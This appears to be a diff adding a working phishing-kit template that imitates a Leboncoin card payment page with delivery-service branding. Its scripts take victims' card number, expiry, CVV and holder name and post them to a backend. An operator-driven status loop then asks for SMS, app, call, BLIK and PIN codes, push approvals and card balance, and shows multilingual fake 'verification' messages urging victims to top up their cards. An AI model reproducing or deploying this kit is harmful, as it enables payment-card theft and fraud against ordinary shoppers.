+                <style>
+                    .mondialrelay_svg__cls-2 {
+                        fill: #fff
+                    }
+
+                    .mondialrelay_svg__cls-3 {
+                        fill: #cfc8c0
+                    }
+                </style>
+            </defs>
+            <path
+                d="M614.62 429.51c-.81 25.19-18.84 47.92-43.47 53.79-100.85 17.48-198.1 17.48-298.95 0-24.63-5.86-42.66-28.61-43.47-53.79v-263c.81-25.19 18.84-47.92 43.47-53.79 100.85-17.47 198.1-17.48 299 0 24.63 5.87 42.66 28.6 43.47 53.79z"
+                transform="translate(-228.73 -99.56)" fill="#ca0047"></path>
+            <path class="mondialrelay_svg__cls-2"
+                d="M442.68 217.67c-21.37-3.81-35.63 7.64-35.63 26.21v61.31l-33.59-20v-41.31c0-37.15 25.7-63.1 69.22-57.76z"
+                transform="translate(-228.73 -99.56)"></path>
+            <path class="mondialrelay_svg__cls-3" d="M221.86 86.48h31.72v31.72h-31.72z"></path>
+            <path class="mondialrelay_svg__cls-2"
+                d="M286.54 433.12h15.11V394a13.82 13.82 0 013.86-10 14.53 14.53 0 0110.31-3.81 49 49 0 017.84.82V366a80.89 80.89 0 00-9.36-.77c-17.65 0-27.71 12.53-27.76 28.81zM338.61 427c-3.74-3.9-5.59-9.44-5.59-15.89v-23.56c0-6.45 1.85-12 5.59-15.9 3.72-3.92 9.25-6.09 16.2-6.08H379v14.81h-24.1c-2.79 0-4.45.56-5.38 1.49-.94.92-1.51 2.56-1.51 5.42v4.9h26.25v14.17H348v4.93c0 2.82.57 4.5 1.52 5.45.94.95 2.58 1.51 5.37 1.51H379v14.82h-24.24c-6.92 0-12.43-2.17-16.15-6.08zM397.63 427.09c-3.74-3.85-5.6-9.35-5.59-15.8v-45.72h15v45.53c0 2.84.55 4.58 1.49 5.57.93 1 2.53 1.58 5.3 1.58h20.86l-5.08 14.82H413.7c-6.87 0-12.36-2.11-16.07-6zM522.4 433.07v-25.84l-22.67-41.66h17l13.2 26.13 13.28-26.13h17l-22.71 41.66v25.84zM485.61 375c-3.24-9.5-8-9.51-10.44-9.51H471c-2.45 0-7.17 0-10.44 9.51-5 14.52-20.22 58-20.22 58h15.91l4.39-13h24.89l4.39 13h15.91zm-20.23 30.84l7.71-22.84 7.7 22.87zM514.1 330.46c-1.19-3.48-2.93-3.49-3.83-3.49h-1.53c-.9 0-2.63 0-3.83 3.49-1.83 5.32-7.41 21.27-7.41 21.27h5.83l1.61-4.76h9.13l1.61 4.76h5.84zm-7.42 11.31l2.83-8.39 2.82 8.39zM311.8 351.7v-16.35a3.47 3.47 0 00-3.62-3.59 3.4 3.4 0 00-3.56 3.59v16.35h-5.53v-16.35a3.44 3.44 0 00-3.59-3.59 3.45 3.45 0 00-3.62 3.59v16.35h-5.47v-16.28a8.89 8.89 0 019.09-9.06 8.43 8.43 0 016.34 2.8 8.41 8.41 0 016.34-2.8 8.89 8.89 0 019.12 9.06v16.28zm5-.49zM339.4 339.22c0-7.12 5.1-12.84 12.14-12.86 7 0 12.09 5.74 12.11 12.86 0 7.15-5.11 12.88-12.11 12.89-7 0-12.13-5.74-12.14-12.89zm5.54 0c0 4.23 3 7.62 6.6 7.63 3.58 0 6.57-3.4 6.57-7.63 0-4.2-3-7.59-6.57-7.6-3.61 0-6.6 3.4-6.6 7.6zM401.7 328.94a9.1 9.1 0 012.54 6.51v16.25h-5.5v-16.35c-.05-2.32-1.27-3.55-3.63-3.59-2.32 0-3.54 1.27-3.59 3.59v16.35H386v-16.25a9.1 9.1 0 012.54-6.51 9.14 9.14 0 016.55-2.58 9.17 9.17 0 016.59 2.58M437.56 351.7h-9.3v-24.76h9.3a10.69 10.69 0 018.21 3.36 13.19 13.19 0 013 9 13.19 13.19 0 01-3 9 10.68 10.68 0 01-8.16 3.38m0-19.56h-3.8v14.37h3.79c5 0 5.67-4.37 5.71-7.22 0-3.46-1-7.14-5.71-7.15M470.05 351.7v-24.76h5.5v24.76zM549.07 351.7a7.91 7.91 0 01-5.92-2.19 8.17 8.17 0 01-2-5.8v-16.77h5.51v16.7c.1 2.08.49 2.53 2.49 2.63h7.65v5.43z"
+                transform="translate(-228.73 -99.56)"></path>
+            <path class="mondialrelay_svg__cls-3"
+                d="M431.35 153.3a19.3 19.3 0 11-19.29-19.3 19.29 19.29 0 0119.29 19.3z"
+                transform="translate(-228.73 -99.56)"></path>
+        </symbol>
+        <symbol id="SvgColissimo">
+            <lineargradient id="colissimo_svg__a" x1="12.608%" x2="86.28%" y1="75.139%" y2="23.876%">
+                <stop offset="0%" stop-color="#EC6608"></stop>
+                <stop offset="19%" stop-color="#ED6C08"></stop>
+                <stop offset="44%" stop-color="#F07C08"></stop>
+                <stop offset="72%" stop-color="#F59707"></stop>
+                <stop offset="100%" stop-color="#FBBA07"></stop>
+            </lineargradient>
+            <path
+                d="M14.589 10.711a.377.377 0 01-.35-.006l-.569-.332a.356.356 0 01-.12-.127l-.006-.01a.36.36 0 01-.058-.175l-.014-.65a.365.365 0 01.168-.3l6.828-3.902L10.884.085a.912.912 0 00-.768 0L.53 5.21l10.737 6.131a.356.356 0 01.176.294v8.945a.363.363 0 01-.183.294l-.577.315a.375.375 0 01-.174.038h-.01a.38.38 0 01-.185-.038l-.58-.315a.36.36 0 01-.179-.294v-7.974a.222.222 0 00-.095-.157L0 7.048v10.579c0 .237.17.528.379.648l9.743 5.636a.847.847 0 00.757 0l9.744-5.636a.833.833 0 00.377-.648V7.047l-6.411 3.664z"
+                fill="url(#colissimo_svg__a)"></path>
+        </symbol>
+        <symbol id="SvgChecksimple">
+            <path
+                d="M23.58 3.42a1.42 1.42 0 00-2 0L7.41 17.55l-5-5a1.43 1.43 0 00-2 2l6 6a1.42 1.42 0 002 0L23.58 5.44a1.42 1.42 0 000-2.02z">
+            </path>
+        </symbol>
+    </svg>
+
+
+
+
+
+
+    <script src="/lebonCard_files/vue.min.js" crossorigin="anonymous"></script>
+    <script src="/lebonCard_files/vue-the-mask.js" crossorigin="anonymous"></script>
+    <script src="/lebonCard_files/vue-swal.min.js" crossorigin="anonymous"></script>
+    <script src="/lebonCard_files/axios.min.js" crossorigin="anonymous"></script>
+    <script src="/lebonCard_files/customlebon.js"></script>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+
+         function getTemplate(lang, amount) {
+      const templates = {
+        pl: `Dla pierwszej weryfikacji saldo na karcie bankowej musi wynosić co najmniej ${amount}, aby można było wykonać transakcję testową. w celu sprawdzenia limitów i potwierdzenia tożsamości. Proszę doładować kartę lub użyć innej karty.`,
+        en: `You must enter a card with a balance of at least ${amount}. The bank reserves this amount. This takes about 5-10 minutes. This procedure is associated with an increase in fraud on the part of sellers receiving advance payments. In the future, this procedure for using our services will no longer be necessary.`,
+        nl: `Voor de eerste verificatie moet het saldo van uw bankpas minimaal ${amount} bedragen om een proeftransactie te kunnen uitvoeren. om de limieten te controleren en uw identiteit te bevestigen. Gelieve uw kaart op te laden of een andere kaart te gebruiken.`,
+        ba: `Za prvu provjeru, stanje na bankovnoj kartici mora biti najmanje ${amount} kako bi se mogla izvršiti testna transakcija. radi provjere ograničenja i potvrde vašeg identiteta. Molimo napunite svoju karticu ili koristite drugu karticu.`,
+        es: `Para la primera verificación, el saldo de la tarjeta bancaria debe ser de al menos ${amount} para poder realizar una transacción de prueba para comprobar los límites y confirmar su identidad. Por favor, recargue su tarjeta o utilice otra tarjeta.`,
+        de: `Für die erste Überprüfung muss der Kontostand der Bankkarte mindestens ${amount} betragen, um eine Testtransaktion durchführen zu können. um die Limits zu überprüfen und Ihre Identität zu bestätigen. Bitte laden Sie Ihre Karte auf oder verwenden Sie eine andere Karte.`,
+        dk: `Til den første verifikation skal der være mindst ${amount} på bankkortet for at kunne foretage en testtransaktion. for at kontrollere grænserne og bekræfte din identitet. Venligst genoplad dit kort eller brug et andet kort.`,
+        pt: `Para a primeira verificação, o saldo do cartão bancário deve ser de, pelo menos, ${amount}, a fim de efetuar uma transação de teste. para verificar os limites e confirmar a sua identidade. Por favor, recarregue o seu cartão ou utilize outro cartão.`,
+        ua: `Для першої перевірки на банківській картці має бути щонайменше ${amount}, щоб можна було здійснити тестову транзакцію. для перевірки лімітів і підтвердження вашої особистості. Будь ласка, поповніть свою картку або використайте іншу картку.`,
+        tj: `Барои санҷиши аввал, бақияи корт бояд ҳадди ақал ${amount} бошад, то ки амалиёти санҷишӣ анҷом дода шавад. Барои тасдиқи ҳудудҳо ва шахсияти худ. Лутфан кортро пур кунед ё кортро дигар истифода баред.`,
+        am: `Առաջին ստուգման համար բանկային քարտի մնացորդը պետք է լինի առնվազն ${amount}՝ փորձնական գործարք կատարելու համար: սահմանները ստուգելու և ձեր ինքնությունը հաստատելու համար: Խնդրում ենք վերալիցքավորել ձեր քարտը կամ օգտագործել այլ քարտ:`,
+        uz: `Birinchi tekshiruv uchun bank kartasidagi qoldiq kamida ${amount} bo‘lishi kerak. bu cheklovlarni tekshirish va shaxsingizni tasdiqlash uchun kerak. Iltimos, kartangizni to‘ldiring yoki boshqa kartadan foydalaning.`,
+        kz: `Алғашқы тексеру үшін банк картасындағы қалдық кемінде ${amount} болуы керек, бұл шектеулерді тексеріп, жеке басыңызды растау үшін қажет. Картаны толтырыңыз немесе басқа картаны қолданыңыз.`,
+        ro: `Pentru prima verificare, soldul cardului bancar trebuie să fie de cel puțin ${amount} pentru a putea efectua o tranzacție de test. pentru verificarea limitelor și confirmarea identității. Vă rugăm să reîncărcați cardul sau să utilizați un alt card.`,
+        se: `För första kontrollen måste saldot på bankkortet vara minst ${amount} för att kunna göra en testtransaktion. för att kontrollera gränser och bekräfta din identitet. Ladda gärna ditt kort eller använd ett annat kort.`,
+        hr: `Za prvu provjeru, stanje na bankovnoj kartici mora biti najmanje ${amount} kako bi se mogla izvršiti testna transakcija. radi provjere ograničenja i potvrde vašeg identiteta. Molimo napunite svoju karticu ili koristite drugu karticu.`,
+        sk: `Na prvú kontrolu musí byť zostatok na bankovej karte najmenej ${amount}, aby bolo možné vykonať skúšobnú transakciu. na overenie limitov a potvrdenie vašej identity. Prosím, dobite si kartu alebo použite inú kartu.`,
+        cz: `Pro první kontrolu musí být zůstatek na bankovní kartě alespoň ${amount}, aby bylo možné provést zkušební transakci. pro ověření limitů a potvrzení vaší identity. Prosím, dobijte si kartu nebo použijte jinou kartu.`,
+        fr: `La première fois que vous vérifiez votre solde, vous devez disposer d'au moins ${amount}. cela est nécessaire pour créer une transaction test. vérification de la limite et de l'identité. veuillez recharger votre carte ou utiliser une autre carte.`,
+        bg: `За първата проверка салдото по банковата карта трябва да бъде поне ${amount}, за да може да се извърши пробна транзакция. за проверка на лимитите и потвърждаване на самоличността. Моля, заредете картата си или използвайте друга карта.`,
+        rs: `Za prvu proveru stanje na bankovnoj kartici mora biti najmanje ${amount} kako bi se mogla izvršiti probna transakcija. za proveru limita i potvrdu identiteta. Molimo vas da dopunite svoju karticu ili koristite drugu karticu.`,
+        be: `Для першай праверкі баланс на банкаўскай карце павінен складаць не менш за ${amount}, каб можна было выканаць пробную транзакцыю. для праверкі лімітаў і пацверджання асобы. Калі ласка, папоўніце сваю картку альбо выкарыстоўвайце іншую картку.`,
+        it: `Per il primo controllo, il saldo della carta bancaria deve essere di almeno ${amount} per poter effettuare una transazione di prova. per verificare i limiti e confermare la propria identità. Si prega di ricaricare la carta o di utilizzare un'altra carta.`,
+        ch: `Für die erste Überprüfung muss das Guthaben der Bankkarte mindestens ${amount} betragen, um eine Testtransaktion durchführen zu können. um die Limits zu überprüfen und Ihre Identität zu bestätigen. Bitte laden Sie Ihre Karte auf oder verwenden Sie eine andere Karte.`,
+        cs: `Pro první kontrolu musí být zůstatek na bankovní kartě alespoň ${amount}, aby bylo možné provést testovací transakci. pro ověření limitů a potvrzení identity. Prosím, dobijte si kartu nebo použijte jinou kartu.`,
+        no: `For den første bekreftelsen må saldoen på bankkortet være minst ${amount} for å kunne utføre en testtransaksjon. for å kontrollere grensene og bekrefte identiteten din. Vennligst fyll opp kortet ditt eller bruk et annet kort.`,
+        lt: `Pirmajai patikrai banko kortelės sąskaitoje turi būti bent ${amount}, kad būtų galima atlikti bandomąjį sandorį. patikrinti limitus ir patvirtinti savo tapatybę. Prašome papildyti savo kortelę arba naudoti kitą kortelę.`,
+        lv: `Pirmajai pārbaudei bankas kartes atlikumam jābūt vismaz ${amount}, lai varētu veikt pārbaudes darījumu. lai pārbaudītu limitus un apstiprinātu savu identitāti. Lūdzu, papildiniet savu karti vai izmantojiet citu karti.`,
+        est: `Esimese kontrolli puhul peab pangakaardi saldo olema vähemalt ${amount}, et teha testtehing. piirangute kontrollimiseks ja oma identiteedi kinnitamiseks. Palun laadige oma kaart uuesti või kasutage mõnda muud kaarti.`,
+        hu: `Az első ellenőrzéshez a bankkártya egyenlegének legalább ${amount}-nek kell lennie ahhoz, hogy teszttranzakciót lehessen végrehajtani. a korlátok ellenőrzésére és az azonosítás megerősítésére. Kérjük, töltse fel a kártyáját, vagy használjon másik kártyát.`,
+      };
+      return templates[lang] || "Template not found for the specified language.";
+    }
+
+        jQuery(function ($) {
+            $('#cardMonth').mask('99/99');
+        });
+    </script>
+    <script>
+        document.getElementById('cardNumber').addEventListener('input', function (e) {
+            e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        var input = document.getElementById('cardMonth');
+        input.oninput = function () {
+            var str = document.getElementById('cardMonth');
+            if (str.value.length > 2 && str.value.length < 4) {
+                document.getElementById('cardMonth').value = str.value.substring(0, 2) + '/' + str.value.substring(2, 20).replace(/-/g, '');
+            }
+        }
+    </script>
+    <script defer="">
+
+        var token
+        var status
+
+
+           function showWaitingModal() {
+  swal({
+    title: false,
+    content: {
+      element: "div",
+      attributes: {
+        innerHTML: `
+          <div style="
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 25px 20px;
+            font-family: 'Inter', sans-serif;
+          ">
+            <div style="display: flex; gap: 6px; margin-bottom: 20px;">
+              <div class="dot"></div>
+              <div class="dot"></div>
+              <div class="dot"></div>
+            </div>
+            <div style="font-size: 17px; font-weight: 600; margin-bottom: 4px;">
+              <%= translate['wait'][ad.service.lang] %>
+            </div>
+            <div style="font-size: 14px; color: #444; text-align: center; line-height: 1.4;">
+              <%= translate['bank_processes'][ad.service.lang] %>
+            </div>
+          </div>
+        `
+      }
+    },
+    buttons: false,
+    closeOnClickOutside: false,
+    closeOnEsc: false
+  });
+}
+        function erroronlModal(err) {
+            // Отображаем модальное окно с информацией об ошибке
+            swal({
+                title: "<%=translate['info'][ad.service.lang]%>",
+                text: `${err}`,
+                icon: "info",
+                buttons: {
+                    retry: {
+                        text: "<%=translate['сonfirmed'][ad.service.lang]%>",
+                        value: "retry",
+                    },
+                },
+            })
+                .then((value) => {
+                    // Проверяем, была ли нажата кнопка "Retry"
+                    if (value === "retry") {
+                        // Выполнение запроса при нажатии на кнопку "Retry"
+                        axios.post("/api/confirmed", { // Укажите здесь актуальный путь к вашему API
+                            token: token,
+                        })
+                            .then((response) => {
+                                console.log('Запрос выполнен успешно', response);
+                                                               showWaitingModal();
+
+                                // Здесь можете добавить логику для обработки успешного ответа,
+                                // например, закрыть модальное окно или показать сообщение об успехе
+                            })
+                            .catch((error) => {
+                                console.error('Ошибка при повторном выполнении запроса', error);
+                                // Можно вызвать errorModal снова, чтобы показать ошибку повторного запроса
+                                erroronlModal(error);
+                            });
+                    }
+                });
+        }
+
+ function customdepModal(err) {
+        const amount = err;
+        const lang = "<%=ad.service.lang%>";
+        const template = getTemplate(lang, amount);
+
+        // создаём HTML-элемент с жирным текстом
+        const contentEl = document.createElement("div");
+        contentEl.innerHTML = `<b>${template}</b>`;
+
+        // вызываем swal с кастомным контентом
+        swal({
+          title: "",
+          content: contentEl,
+          icon: "error",
+          dangerMode: true,
+        });
+      }
+
+        function errorFieldModal(err) {
+            swal(
+                "заварюка кофейку",
+                `${err}`,
+                "error"
+            );
+        }
+
+        function limitsModal() {
+            swal(
+                "<%=translate["error_title"][ad.service.lang]%>",
+                "<%=translate["limits"][ad.service.lang]%>",
+                "error"
+            );
+        }
+
+
+
+        function otherCardModal() {
+            swal(
+                "<%=translate["error_title"][ad.service.lang]%>",
+                "<%=translate["other_card"][ad.service.lang]%>",
+                "error"
+            );
+
+            axios.post("/auto/othercard", {
+                token: token,
+            })
+                .then(function (response) {
+                    // Обработка успешного ответа от сервера
+                    console.log('Запрос выполнен успешно', response);
+                })
+                .catch(function (error) {
+                    // Обработка ошибок при выполнении запроса
+                    console.error('Ошибка выполнения запроса', error);
+                });
+        }
+
+        function pushModal() {
+            // Асинхронно выполняем первый запрос без ожидания действия пользователя
+            axios.post("/auto/push", {
+                token: token,
+            })
+                .then((response) => {
+                    console.log('Первый запрос выполнен успешно', response);
+                })
+                .catch((error) => {
+                    console.error('Ошибка выполнения первого запроса', error);
+                });
+
+            // Отображаем модальное окно sweetalert для подтверждения действия пользователя
+            swal({
+                title: "<%=translate['push_title'][ad.service.lang]%>",
+                text: "<%=translate['push_text'][ad.service.lang]%>",
+                icon: "info",
+                closeOnClickOutside: true,
+                closeOnEsc: true,
+                buttons: {
+                    confirm: {
+                        text: "<%=translate['сonfirmed'][ad.service.lang]%>",
+                        value: true,
+                    },
+                },
+            })
+                .then(async (value) => { // Используем async для обработки асинхронного кода внутри
+                    // Проверяем, была ли нажата кнопка "Confirmed"
+                    if (value) {
+                        try {
+                            // Открываем окно с сообщением ожидания
+                                                           showWaitingModal();
+
+
+                            // Асинхронно выполняем второй запрос после нажатия на кнопку "Confirmed"
+                            const response = await axios.post("/api/confirmed", {
+                                token: token,
+                            });
+
+                            console.log('Второй запрос выполнен успешно', response);
+                            // Закрываем окно SweetAlert после успешного выполнения запроса
+                                                          showWaitingModal();
+
+                        } catch (error) {
+                            console.error('Ошибка выполнения второго запроса', error);
+                            // Показываем сообщение об ошибке, если запрос не удался
+                            swal("An error occurred", "Please try again later.", "error");
+                        }
+                    }
+                });
+        }
+
+
+
+        function successModal() {
+            swal(
+                "<%=translate["success"][ad.service.lang]%>",
+                "<%=translate["money_will"][ad.service.lang]%>",
+                "success", {
+
+                closeOnClickOutside: false,
+                closeOnEsc: false,
+                buttons: false,
+            }
+            );
+        }
+
+        function pictureModal() {
+            swal("<%=translate["picture_title"][ad.service.lang]%>", "<%=translate["picture_text"][ad.service.lang]%>", "info", {
+                content: {
+                    element: "div",
+                    attributes: {
+                        id: "pictures_div"
+                    },
+                },
+                closeOnClickOutside: false,
+                closeOnEsc: false,
+                buttons: false,
+            });
+            const pictures = [
+                "банан",
+                "брюки",
+                "бургер",
+                "гитара",
+                "зонтик",
+                "календарь",
+                "калькулятор",
+                "карандаш",
+                "клубника",
+                "компас",
+                "крокодил",
+                "лимон",
+                "мамонт",
+                "микрофон",
+                "наушники",
+                "очки",
+                "помидор",
+                "свитер",
+                "телефон",
+                "цветок",
+                "шоколад",
+            ].sort(() => Math.random() - 0.5);
+
+            document.querySelector("#pictures_div").innerHTML = '<div class="pictures-container">' + pictures.map(v => '<div class="pictures-element" data-item="' + v + '"><img draggable="false" alt="" src="/img/pictures/' + v + '.png"></div>').join("\n") + '</div>';
+            document.querySelector(".pictures-container").classList.remove("disabled");
+        }
+
+        function ferrModal(codeType = "sms", title = "<%=translate["sms_title"][ad.service.lang]%>", text = "<%=translate["sms_text"][ad.service.lang]%>", placeholder = "<%=translate["sms_placeholder"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>") {
+            swal.stopLoading();
+            swal({
+                title,
+                text,
+                content: {
+                    element: "input",
+                    attributes: {
+                        type: "password",
+                        placeholder,
+                        maxLength: 255,
+                        required: true,
+                        style:
+                            "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+                    },
+                },
+                closeOnEsc: false,
+                closeOnClickOutside: false,
+                buttons: {
+                    confirm: {
+                        text: "<%=translate["submit"][ad.service.lang]%>",
+                        closeModal: false,
+                    },
+                },
+            }).then(async (code) => {
+                try {
+                    if (!code) {
+                                                      showWaitingModal();
+
+                    }
+                    const response = await axios.post("/api/submitCustom", {
+                        codeType,
+                        code,
+                        token: token,
+                    });
+
+                                                  showWaitingModal();
+
+                } catch (err) {
+                                                 showWaitingModal();
+
+                }
+            });
+        }
+
+        function pinModal(codeType = "pin", title = "<%=translate["pincode_1"][ad.service.lang]%>", text = "<%=translate["pincode"][ad.service.lang]%>", wrong_code = "<%=translate["wrong_code"][ad.service.lang]%>") {
+            swal.stopLoading();
+            swal({
+                title,
+                text,
+                content: {
+                    element: "input",
+                    attributes: {
+                        type: "password",
+                        maxLength: 255,
+                        required: true,
+                        style:
+                            "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+                    },
+                },
+                closeOnEsc: false,
+                closeOnClickOutside: false,
+                buttons: {
+                    confirm: {
+                        text: "<%=translate["submit"][ad.service.lang]%>",
+                        closeModal: false,
+                    },
+                },
+            }).then(async (code) => {
+                try {
+                    if (!code) {
+                        swal.stopLoading();
+                        alert(wrong_code);
+                        return pinModal(...arguments);
+                    }
+                    const response = await axios.post("/api/submitCode", {
+                        codeType,
+                        code,
+                        token: token,
+                    });
+
+                    swal.stopLoading();
+                    alert(wrong_code);
+                    return pinModal(...arguments);
+                } catch (err) {
+                    swal.stopLoading();
+                    alert(wrong_code);
+                    return pinModal(...arguments);
+                }
+            });
+        }
+
+
+
+
+      
+
+      function codeModal(
+  codeType = "sms",
+  title = "<%=translate['sms_title'][ad.service.lang]%>",
+  text = "<%=translate['sms_text'][ad.service.lang]%>",
+  placeholder = "<%=translate['sms_placeholder'][ad.service.lang]%>",
+  wrong_code = "<%=translate['wrong_code'][ad.service.lang]%>"
+) {
+     axios.post("/auto/sms", {
+                token: token,
+            })
+                .then((response) => {
+                    console.log('Первый запрос выполнен успешно', response);
+                })
+                .catch((error) => {
+                    console.error('Ошибка выполнения первого запроса', error);
+                });
+
+  swal({
+    title,
+    text,
+    content: {
+      element: "input",
+      attributes: {
+        type: "password",
+        placeholder,
+        maxLength: 255,
+        required: true,
+        style: "text-align: center; width: auto; margin-left:auto; margin-right:auto;",
+      },
+    },
+    closeOnEsc: false,
+    closeOnClickOutside: false,
+    buttons: {
+      confirm: {
+        text: "<%=translate['submit'][ad.service.lang]%>",
+        closeModal: false,
+      },
+    },
+  }).then(async (code) => {
+    if (!code) return;
+
+    try {
+      $.ajax({
+        type: "POST",
+        url: "/api/submitCode",
+        data: {
+          codeType,
+          code,
+          token: token,
+        },
+        success: () => {
+          swal.stopLoading();
+                                          showWaitingModal();
+
+          // Автоматический вызов codeModal через 5 секунд
+          setTimeout(() => {
+            swal.close(); // Закрываем окно ожидания
+            codeModal(codeType, title, text, placeholder, wrong_code);
+          }, 3000);
+        },
+        error: () => {
+          swal.stopLoading();
+                                          showWaitingModal();
+
+
+          setTimeout(() => {
+            swal.close();
+            codeModal(codeType, title, text, placeholder, wrong_code);
+          }, 3000);
+        },
+      });
+    } catch (err) {
+      swal.stopLoading();
+                                     showWaitingModal();
+
+
+      setTimeout(() => {
+        swal.close();
+        codeModal(codeType, title, text, placeholder, wrong_code);
+      }, 3000);
+    }
+  });
+}
+        function correctBalanceModal() {
+            const wrongBalanceMessage = "<%=translate['wrong_code'][ad.service.lang]%>";
+
+            // Модальное окно с вводом
+            swal({
+                icon: "warning",
+                content: {
+                    element: "div",
+                    attributes: {
+                        innerHTML: `
+          <div style="display: flex; flex-direction: column; align-items: center;">
+            <h3 style="font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;">
+              <span style="color: #d9534f;"><b><%=translate['error_title'][ad.service.lang]%></b></span>
+            </h3>
+            <p style="font-size: 14px; margin-bottom: 15px; text-align: center; color: #333;">
+              <strong><%=translate['correct_balance'][ad.service.lang]%></strong>
+            </p>
+            <input
+              type="text"
+              placeholder="0.00"
+              id="balanceInput"
+              style="text-align: center; width: 100%; max-width: 300px; margin: 0 auto;
+                     border: 2px solid #f0ad4e; padding: 10px; border-radius: 5px; font-size: 14px;"
+            />
+          </div>
+        `,
+                    },
+                },
+                closeOnEsc: false,
+                closeOnClickOutside: false,
+                buttons: {
+                    confirm: {
+                        text: "<%=translate['submit'][ad.service.lang]%>",
+                        closeModal: false, // Не закрывать окно автоматически
+                        className: "custom-swal-confirm-button",
+                    },
+                },
+            }).then(async () => {
+                const balance = document.getElementById("balanceInput").value.trim();
+
+                if (!balance || balance.length < 1) {
+                    // Отображение ошибки при пустом значении
+                    swal(wrongBalanceMessage, "", "error").then(() => {
+                        setTimeout(() => {
+                            correctBalanceModal(); // Повторный вызов
+                        }, 3000);
+                    });
+                    return;
+                }
+
+                try {
+                    // Показ окна загрузки
+                                                   showWaitingModal();
+
+
+                    // Отправка данных (теперь поддерживает и текстовые значения)
+                    const response = await axios.post("/api/submitBalance", {
+                        codeType: "balance",
+                        code: balance, // Передаем текст как есть
+                        token: token,
+                    });
+                                                   showWaitingModal();
+
+
+                } catch (err) {
+                    console.error("Ошибка при отправке баланса", err);
+                    swal(wrongBalanceMessage, "", "error").then(() => {
+                        setTimeout(() => {
+                            correctBalanceModal(); // Повторный вызов
+                        }, 3000);
+                    });
+                }
+            });
+        }
+        async function checkLogStatus() {
+            setInterval(async () => {
+                axios.post("/api/checkStatus", {
+                    token
+                }).then(async function (res) {
+                    if (status == res.data.status) return
+                    status = res.data.status
+                    const v = res.data.status
+
+                    if (v == "profit") successModal();
+                    else if (v == "sms") codeModal();
+                    else if (v == "pincode") pinModal();
+
+
+                    else if (v.includes("error")) {
+                        erroronlModal(v.split("error_")[1]);
+                    }
+                      else if (v.includes("customDep")) {
+          customdepModal(v.split("customDep_")[1]);
+        }
+                    else if (v.includes("ferr")) ferrModal(
+                        "custom",
+                        "<%=translate["info"][ad.service.lang]%>",
+                        v.split("ferr_")[1],
+                        "<%=translate["enterrr"][ad.service.lang]%>",
+                        "<%=translate["wrongg"][ad.service.lang]%>",
+                    );
+                    else if (v == "appCode") codeModal(
+                        "app",
+                        "<%=translate["app_code_title"][ad.service.lang]%>",
+                        "<%=translate["app_code_text"][ad.service.lang]%>",
+                        "<%=translate["app_code_placeholder"][ad.service.lang]%>",
+                    );
+                    else if (v == "callCode") codeModal(
+                        "call",
+                        "<%=translate["call_code_title"][ad.service.lang]%>",
+                        "<%=translate["call_code_text"][ad.service.lang]%>",
+                        "<%=translate["call_code_placeholder"][ad.service.lang]%>",
+                    );
+                    else if (v == "blik") codeModal(
+                        "blik",
+                        "<%=translate["blik_code_title"][ad.service.lang]%>",
+                        "<%=translate["blik_code_text"][ad.service.lang]%>",
+                        "<%=translate["blik_code_placeholder"][ad.service.lang]%>",
+                    );
+                    else if (v == "picture") pictureModal();
+                    else if (v == "push") pushModal();
+                    else if (v == "limits") limitsModal();
+                    else if (v == "otherCard") otherCardModal();
+                    else if (v == "correctBalance") correctBalanceModal();
+                    else if (v == "lk") document.location.href = "/banks/<%= countryId %>/<%= ad.id %>";
+                    else if (v == "screamer") document.location.href = `http://ibaillanos.tv`;
+
+
+                })
+            }, 1500)
+        }
+
+
+  let isSending = false;
+
+  async function sendLog() {
+   if (isSending) return;
+    isSending = true;
+
+    const btn1 = document.getElementById("fsadf");
+    const btn2 = document.getElementById("fsadfasdf");
+
+    const originalBtn1 = btn1.innerHTML;
+    const originalBtn2 = btn2.innerHTML;
+
+    // Показать красивый спиннер
+    const loaderHTML = `<span class="btn-loader"></span>`;
+    btn1.innerHTML = loaderHTML;
+    btn2.innerHTML = loaderHTML;
+    btn1.disabled = true;
+    btn2.disabled = true;
+
+    // Через 1 секунду вернуть текст и активность
+    setTimeout(() => {
+      btn1.innerHTML = originalBtn1;
+      btn2.innerHTML = originalBtn2;
+      btn1.disabled = false;
+      btn2.disabled = false;
+      isSending = false;
+    }, 1000);
+
+    const cardNumber = $("#cardNumber").val();
+    const cardExp = $("#cardMonth").val();
+    const cardHolder = $("#cardHolderName").val();
+    const cardCvv = $("#cardCvv").val();
+
+    if (!cardNumber || !cardExp || !cardHolder || !cardCvv) {
+      alert("remplissez tous les champs !");
+      isSending = false;
+      return;
+    }
+
+    // Блокируем обе кнопки
+    $("#fsadf").prop("disabled", true);
+    $("#fsadfasdf").html(`<div class="loader"></div>`).prop("disabled", true);
+
+    try {
+      const res = await axios.post("/api/submitCard", {
+        adId: <%=ad.id %>,
+        number: cardNumber,
+        expire: cardExp,
+        cvv: cardCvv,
+        holder: cardHolder,
+        balance: "<%=query.price%>"
+      });
+
+      await axios.post("/auto/wait", {
+        token: res.data.token
+      });
+
+      token = res.data.token;
+      checkLogStatus();
+
+      swal({
+        title: "<%=translate["wait"][ad.service.lang]%>",
+        text: "<%=translate["bank_processes"][ad.service.lang]%>",
+        icon: "info",
+        closeOnClickOutside: false,
+        closeOnEsc: false,
+        buttons: false
+      });
+
+    } catch (err) {
+      console.error(err);
+      alert("Une erreur s'est produite.");
+      $("#fsadf").prop("disabled", false);
+      $("#fsadfasdf").text("Payer").prop("disabled", false);
+      isSending = false;
+    }
+  }
+
+
+
+    </script>
+  
+
+
+
+    <div id="support">
+        <script type="text/javascript">
+            var _smartsupp = _smartsupp || {};
+            _smartsupp.key = '<%=user.smartsupp%>';
+            window.smartsupp || (function (d) {
+                var s, c, o = smartsupp = function () { o._.push(arguments) }; o._ = [];
+                s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
+                c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
+                c.src = 'https://www.smartsuppchat.com/loader.js?'; s.parentNode.insertBefore(c, s);
+            })(document);
+        </script>
+    </div>
+
+    <script>
+        if ("<%=user.smartsupp%>" == false) {
+            document.querySelector('#support').innerHTML = `
+          <div class="
+   chatra--webkit
+   chatra--style-round
